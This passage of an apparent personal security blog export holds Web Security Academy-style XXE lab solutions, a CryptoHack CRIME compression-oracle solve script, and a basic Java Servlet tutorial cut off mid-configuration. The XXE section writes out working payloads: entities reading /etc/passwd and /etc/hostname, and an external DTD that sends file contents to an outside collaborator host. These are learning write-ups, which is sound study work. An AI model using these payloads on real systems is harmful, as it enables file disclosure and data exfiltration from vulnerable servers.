<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span><span class="meta">&lt;!DOCTYPE <span class="keyword">test</span> [ <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://0bcd7g0t2qp0zd0gl0y23hktjkpadz.burpcollaborator.net&quot;</span>&gt;</span> ]&gt;</span><span class="tag">&lt;<span class="name">stockCheck</span>&gt;</span><span class="tag">&lt;<span class="name">productId</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">productId</span>&gt;</span><span class="tag">&lt;<span class="name">storeId</span>&gt;</span>1<span class="tag">&lt;/<span class="name">storeId</span>&gt;</span><span class="tag">&lt;/<span class="name">stockCheck</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="level-4-Blind-XXE-with-out-of-band-interaction-via-XML-parameter-entities">level 4 Blind XXE with out-of-band interaction via XML parameter entities</h3>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span><span class="meta">&lt;!DOCTYPE <span class="keyword">stockCheck</span> [<span class="meta">&lt;!ENTITY % <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://3lpghjawctz39gajv385dkuwtnzen3.burpcollaborator.net&quot;</span>&gt;</span> %xxe; ]&gt;</span><span class="tag">&lt;<span class="name">stockCheck</span>&gt;</span><span class="tag">&lt;<span class="name">productId</span>&gt;</span>1<span class="tag">&lt;/<span class="name">productId</span>&gt;</span><span class="tag">&lt;<span class="name">storeId</span>&gt;</span>1<span class="tag">&lt;/<span class="name">storeId</span>&gt;</span><span class="tag">&lt;/<span class="name">stockCheck</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="level-5-Exploiting-blind-XXE-to-exfiltrate-data-using-a-malicious-external-DTD">level 5 Exploiting blind XXE to exfiltrate data using a malicious external DTD</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///etc/hostname&quot;&gt;</span><br><span class="line">&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; exfil SYSTEM &#x27;http://jg3wcz5c79uj4w5zqj3l80pco3uwil.burpcollaborator.net/?x=%file;&#x27;&gt;&quot;&gt;</span><br><span class="line">%eval;</span><br><span class="line">%exfil;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM &quot;https://exploit-0aad004b035681db811da27d01c20084.exploit-server.net/exploit.dtd&quot;&gt; %xxe;]&gt;&lt;stockCheck&gt;&lt;productId&gt;1&lt;/productId&gt;&lt;storeId&gt;1&lt;/storeId&gt;&lt;/stockCheck&gt;</span><br></pre></td></tr></table></figure>
<h3 id="level-6-Exploiting-blind-XXE-to-retrieve-data-via-error-messages">level 6 Exploiting blind XXE to retrieve data via error messages</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; error SYSTEM &#x27;file:///invalid/%file;&#x27;&gt;&quot;&gt;</span><br><span class="line">%eval;</span><br><span class="line">%error;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM &quot;https://exploit-0a7e00cb043ec7848335a00e018c00e9.exploit-server.net/exploit&quot;&gt; %xxe;]&gt;&lt;stockCheck&gt;&lt;productId&gt;1&lt;/productId&gt;&lt;storeId&gt;1&lt;/storeId&gt;&lt;/stockCheck&gt;</span><br></pre></td></tr></table></figure>
<h3 id="level-7-Exploiting-XInclude-to-retrieve-files">level 7 Exploiting XInclude to retrieve files</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;foo xmlns:xi=&quot;http://www.w3.org/2001/XInclude&quot;&gt;&lt;xi:include parse=&quot;text&quot; href=&quot;file:///etc/passwd&quot;/&gt;&lt;/foo&gt;</span><br></pre></td></tr></table></figure>
<h3 id="level-8-Exploiting-XXE-via-image-file-upload">level 8 Exploiting XXE via image file upload</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; standalone=&quot;yes&quot;?&gt;&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM &quot;file:///etc/hostname&quot; &gt; ]&gt;&lt;svg width=&quot;128px&quot; height=&quot;128px&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot; xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; version=&quot;1.1&quot;&gt;&lt;text font-size=&quot;16&quot; x=&quot;0&quot; y=&quot;16&quot;&gt;&amp;xxe;&lt;/text&gt;&lt;/svg&gt;</span><br></pre></td></tr></table></figure>
<h3 id="level-9-Exploiting-XXE-to-retrieve-data-by-repurposing-a-local-DTD">level 9 Exploiting XXE to retrieve data by repurposing a local DTD</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE message [</span><br><span class="line">&lt;!ENTITY % local_dtd SYSTEM &quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % ISOamso &#x27;</span><br><span class="line">&lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span><br><span class="line">&amp;#x25;eval;</span><br><span class="line">&amp;#x25;error;</span><br><span class="line">&#x27;&gt;</span><br><span class="line">%local_dtd;</span><br><span class="line">]&gt;&lt;stockCheck&gt;&lt;productId&gt;1&lt;/productId&gt;&lt;storeId&gt;1&lt;/storeId&gt;&lt;/stockCheck&gt;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>xxe</tag>
      </tags>
  </entry>
  <entry>
    <title>ctrime</title>
    <url>/2023/03/03/16-41-44/</url>
    <content><![CDATA[<h2 id="CRIME漏洞–CVE-2012-4929">CRIME漏洞–CVE - 2012-4929</h2>
<span id="more"></span>
<p>学习题目来源：<a href="https://aes.cryptohack.org/ctrime/">https://aes.cryptohack.org/ctrime/</a></p>
<p>原理：<a href="https://en.wikipedia.org/wiki/CRIME">https://en.wikipedia.org/wiki/CRIME</a></p>
<p>通过数据压缩过程导致的加密方式，使得敌手不断发送信息加密，判断压缩数据的长度爆破出数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from Crypto.Cipher import AES</span><br><span class="line">from Crypto.Util import Counter</span><br><span class="line">import zlib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">KEY = ?</span><br><span class="line">FLAG = ?</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@chal.route(&#x27;/ctrime/encrypt/&lt;plaintext&gt;/&#x27;)</span><br><span class="line">def encrypt(plaintext):</span><br><span class="line">    plaintext = bytes.fromhex(plaintext)</span><br><span class="line"></span><br><span class="line">    iv = int.from_bytes(os.urandom(16), &#x27;big&#x27;)</span><br><span class="line">    cipher = AES.new(KEY, AES.MODE_CTR, counter=Counter.new(128, initial_value=iv))</span><br><span class="line">    encrypted = cipher.encrypt(zlib.compress(plaintext + FLAG.encode()))</span><br><span class="line"></span><br><span class="line">    return &#123;&quot;ciphertext&quot;: encrypted.hex()&#125;</span><br></pre></td></tr></table></figure>
<p>zlib.compress对于多段重复内容，但是不同长度的byte压缩后的长度一样，AES的CRT模式对于任意分组都可以进行加密，不会对加密明文进行填充，通过加入不可能存在的字符，使得需要爆破的字符位置在得到正确的字符后会发生长度变化这个特点得到flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import zlib</span><br><span class="line"></span><br><span class="line">import requests, sys</span><br><span class="line">s=zlib.compress(b&#x27;crypto&#123;crypto&#123;crypto&#123;&#x27;)</span><br><span class="line">print(len(s))</span><br><span class="line">ss=zlib.compress(b&#x27;crypto&#123;crypto&#123;&#x27;)</span><br><span class="line">print(len(ss))</span><br><span class="line">assert len(s)==len(ss)</span><br><span class="line">solution = &quot;crypto&#123;&quot;</span><br><span class="line">chars = &#x27;ABCDEFGHIJKLMNOPQRTSUVWXYZ0123456789_abcdefghijklmnopqrstuvwxyz&#125;&#x27;</span><br><span class="line">invalid_char = &#x27;;&#x27;</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    p = (solution + invalid_char) * 2</span><br><span class="line">    print(p)</span><br><span class="line">    r = requests.get(&quot;https://aes.cryptohack.org/ctrime/encrypt/&quot; + p.encode(&#x27;ascii&#x27;).hex()).json()</span><br><span class="line">    sample = len(r[&#x27;ciphertext&#x27;])</span><br><span class="line">    print(sample)</span><br><span class="line">    for c in chars:</span><br><span class="line">        print((solution + c) * 2)</span><br><span class="line">        r = requests.get(&quot;https://aes.cryptohack.org/ctrime/encrypt/&quot; + ((solution + c) * 2).encode(&#x27;ascii&#x27;).hex()).json()</span><br><span class="line">        print(len(r[&#x27;ciphertext&#x27;]))</span><br><span class="line">        if len(r[&#x27;ciphertext&#x27;]) &lt; sample:</span><br><span class="line">            solution += c</span><br><span class="line">            print(solution)</span><br><span class="line">            if c == &quot;&#125;&quot;:</span><br><span class="line">                print(&quot;Solution Found!&quot;, solution)</span><br><span class="line">                sys.exit()</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>
<p>参考连接：</p>
<p><a href="https://github.com/MateaLukiccc/CryptoHack/blob/4fd64f8cc7356ed11ceb4f356a3686e7dd84f83f/Symmetric%20Ciphers/Stream%20Ciphers/CTRTIME.py">https://github.com/MateaLukiccc/CryptoHack/blob/4fd64f8cc7356ed11ceb4f356a3686e7dd84f83f/Symmetric Ciphers/Stream Ciphers/CTRTIME.py</a></p>
]]></content>
      <categories>
        <category>crypto</category>
      </categories>
      <tags>
        <tag>crypto-CVE</tag>
      </tags>
  </entry>
  <entry>
    <title>java-Servlet</title>
    <url>/2023/08/16/17-56-07/</url>
    <content><![CDATA[<h1>Servlet</h1>
<span id="more"></span>
<h2 id="基本Servlet实现写法">基本Servlet实现写法</h2>
<h3 id="原生Servlet">原生Servlet</h3>
<p>需要重写5个接口</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.servlet.Servlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletConfig;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyServlet</span> <span class="keyword">implements</span> <span class="title class_">Servlet</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(ServletConfig config)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">        <span class="comment">// 初始化操作，可以在这里进行一些设置</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> ServletConfig <span class="title function_">getServletConfig</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(ServletRequest req, ServletResponse res)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        res.setContentType(<span class="string">&quot;text/html&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> res.getWriter();</span><br><span class="line">        <span class="type">String</span> <span class="variable">helloValue</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;hello&quot;</span>); <span class="comment">//实现hello参数的传入以及处理，但是无法分辨get，post请求</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (helloValue != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (helloValue.equals(<span class="string">&quot;1314&quot;</span>)) &#123;</span><br><span class="line">                out.println(<span class="string">&quot;&lt;html&gt;&lt;body&gt;&quot;</span>);</span><br><span class="line">                out.println(<span class="string">&quot;&lt;h1&gt;520&lt;/h1&gt;&quot;</span>);</span><br><span class="line">                out.println(<span class="string">&quot;&lt;/body&gt;&lt;/html&gt;&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (helloValue.equals(<span class="string">&quot;520&quot;</span>)) &#123;</span><br><span class="line">                out.println(<span class="string">&quot;&lt;html&gt;&lt;body&gt;&quot;</span>);</span><br><span class="line">                out.println(<span class="string">&quot;&lt;h1&gt;1314&lt;/h1&gt;&quot;</span>);</span><br><span class="line">                out.println(<span class="string">&quot;&lt;/body&gt;&lt;/html&gt;&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                out.println(<span class="string">&quot;&lt;html&gt;&lt;body&gt;&quot;</span>);</span><br><span class="line">                out.println(<span class="string">&quot;&lt;h1&gt;Other&lt;/h1&gt;&quot;</span>);</span><br><span class="line">                out.println(<span class="string">&quot;&lt;/body&gt;&lt;/html&gt;&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            out.println(<span class="string">&quot;&lt;html&gt;&lt;body&gt;&quot;</span>);</span><br><span class="line">            out.println(<span class="string">&quot;&lt;h1&gt;No Parameter&lt;/h1&gt;&quot;</span>);</span><br><span class="line">            out.println(<span class="string">&quot;&lt;/body&gt;&lt;/html&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getServletInfo</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 清理资源等操作</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="GenericServlet写法">GenericServlet写法</h3>
<p>已经完成了一部分的Servlet，只需要重写service即可</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GenericServlet</span> <span class="keyword">extends</span> <span class="title class_">javax</span>.servlet.GenericServlet &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        servletResponse.setContentType(<span class="string">&quot;text/html&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> servletResponse.getWriter();</span><br><span class="line">        out.println(<span class="string">&quot;&lt;html&gt;&lt;body&gt;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;h1&gt;Hello from GenericServlet&lt;/h1&gt;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;/body&gt;&lt;/html&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>传参</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GenericServlet</span> <span class="keyword">extends</span> <span class="title class_">javax</span>.servlet.GenericServlet &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="comment">// 获取请求参数</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">paramValue</span> <span class="operator">=</span> servletRequest.getParameter(<span class="string">&quot;paramName&quot;</span>);</span><br><span class="line"></span><br><span class="line">        servletResponse.setContentType(<span class="string">&quot;text/html&quot;</span>);</span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> servletResponse.getWriter();</span><br><span class="line"></span><br><span class="line">        out.println(<span class="string">&quot;&lt;html&gt;&lt;body&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (paramValue != <span class="literal">null</span>) &#123;</span><br><span class="line">            out.println(<span class="string">&quot;&lt;h1&gt;Parameter value: &quot;</span> + paramValue + <span class="string">&quot;&lt;/h1&gt;&quot;</span>);</span><br><span class="line">            <span class="comment">// 在这里添加对参数的处理逻辑</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            out.println(<span class="string">&quot;&lt;h1&gt;No parameter value provided.&lt;/h1&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        out.println(<span class="string">&quot;&lt;/body&gt;&lt;/html&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>但是依旧无法分辨get和post请求，需要强制转化为HttpServlet</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletResponse;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest; <span class="comment">// 注意导入</span></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GenericServlet</span> <span class="keyword">extends</span> <span class="title class_">javax</span>.servlet.GenericServlet &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="comment">// 将 ServletRequest 强制转换为 HttpServletRequest</span></span><br><span class="line">        <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> (HttpServletRequest) servletRequest;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取请求方法</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">method</span> <span class="operator">=</span> request.getMethod();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;GET&quot;</span>.equals(method)) &#123;</span><br><span class="line">            <span class="comment">// 处理 GET 请求</span></span><br><span class="line">            servletResponse.setContentType(<span class="string">&quot;text/html&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> servletResponse.getWriter();</span><br><span class="line">            out.println(<span class="string">&quot;&lt;html&gt;&lt;body&gt;&quot;</span>);</span><br><span class="line">            out.println(<span class="string">&quot;&lt;h1&gt;Hello from GET request&lt;/h1&gt;&quot;</span>);</span><br><span class="line">            out.println(<span class="string">&quot;&lt;/body&gt;&lt;/html&gt;&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;POST&quot;</span>.equals(method)) &#123;</span><br><span class="line">            <span class="comment">// 处理 POST 请求</span></span><br><span class="line">            servletResponse.setContentType(<span class="string">&quot;text/html&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> servletResponse.getWriter();</span><br><span class="line">            out.println(<span class="string">&quot;&lt;html&gt;&lt;body&gt;&quot;</span>);</span><br><span class="line">            out.println(<span class="string">&quot;&lt;h1&gt;Hello from POST request&lt;/h1&gt;&quot;</span>);</span><br><span class="line">            out.println(<span class="string">&quot;&lt;/body&gt;&lt;/html&gt;&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 其他类型的请求</span></span><br><span class="line">            servletResponse.setContentType(<span class="string">&quot;text/html&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> servletResponse.getWriter();</span><br><span class="line">            out.println(<span class="string">&quot;&lt;html&gt;&lt;body&gt;&quot;</span>);</span><br><span class="line">            out.println(<span class="string">&quot;&lt;h1&gt;Unsupported request method&lt;/h1&gt;&quot;</span>);</span><br><span class="line">            out.println(<span class="string">&quot;&lt;/body&gt;&lt;/html&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="HttoServlet">HttoServlet</h3>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HttpServlet</span> <span class="keyword">extends</span> <span class="title class_">javax</span>.servlet.http.HttpServlet &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="comment">// 获取名为 &quot;paramName&quot; 的请求参数值</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">paramName</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;paramName&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (paramName != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 根据参数值进行不同的处理</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="string">&quot;hello&quot;</span>.equals(paramName)) &#123;</span><br><span class="line">                resp.getWriter().write(<span class="string">&quot;Hello, World!&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;bye&quot;</span>.equals(paramName)) &#123;</span><br><span class="line">                resp.getWriter().write(<span class="string">&quot;Goodbye!&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                resp.getWriter().write(<span class="string">&quot;Unknown parameter value&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            resp.getWriter().write(<span class="string">&quot;No parameter provided&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="comment">// 处理 POST 请求</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">paramName</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;paramName&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (paramName != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 根据参数值进行不同的处理</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="string">&quot;hello&quot;</span>.equals(paramName)) &#123;</span><br><span class="line">                resp.getWriter().write(<span class="string">&quot;Hello, World! (POST)&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;bye&quot;</span>.equals(paramName)) &#123;</span><br><span class="line">                resp.getWriter().write(<span class="string">&quot;Goodbye! (POST)&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                resp.getWriter().write(<span class="string">&quot;Unknown parameter value (POST)&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            resp.getWriter().write(<span class="string">&quot;No parameter provided (POST)&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="路由设置">路由设置</h2>
<h3 id="web-xml">web.xml</h3>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">version</span>=<span class="string">&quot;4.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>MyServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>MyServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>MyServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/MyServlet<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>GenericServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>GenericServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">load-on-startup</span>&gt;</span>1<span class="tag">&lt;/<span class="name">load-on-startup</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>GenericServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/GenericServlet<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span 